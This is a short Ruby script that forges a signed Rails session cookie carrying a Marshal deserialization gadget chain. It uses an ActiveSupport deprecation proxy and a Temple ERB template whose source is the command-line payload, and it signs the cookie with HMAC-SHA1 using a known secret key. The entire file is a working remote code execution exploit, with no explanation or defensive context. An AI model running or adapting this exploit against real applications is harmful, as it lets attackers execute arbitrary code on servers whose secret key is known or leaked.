require 'base64'
require 'openssl'
require 'erb'
require 'bundler'
require 'temple'
  
@key = 'secret'
@payload = ARGV.join ' '
  
def gen_cookie_with_digest(cookie_data)
  cookie = Base64.strict_encode64(Marshal.dump(cookie_data)).chomp
  digest = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('SHA1'), @key, cookie)
  "#{cookie}--#{digest}"
end
 
class ActiveSupport
  class Deprecation
    class DeprecatedInstanceVariableProxy
      def initialize(i, m)
        @instance = i
        @method = m
        @deprecator = Bundler::UI::Silent.new
      end
    end
  end
end
  
#erb = Temple::ERB::Template.new { "<% #{@payload} %>" }

#erb = ERB::new("<% #{@payload} %>").result

erb = Temple::ERB::Template.new { "" }
erb.instance_variable_set :@reader, nil
erb.instance_variable_set :@src, @payload

cookie_data = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :render
  
puts gen_cookie_with_digest(cookie_data)

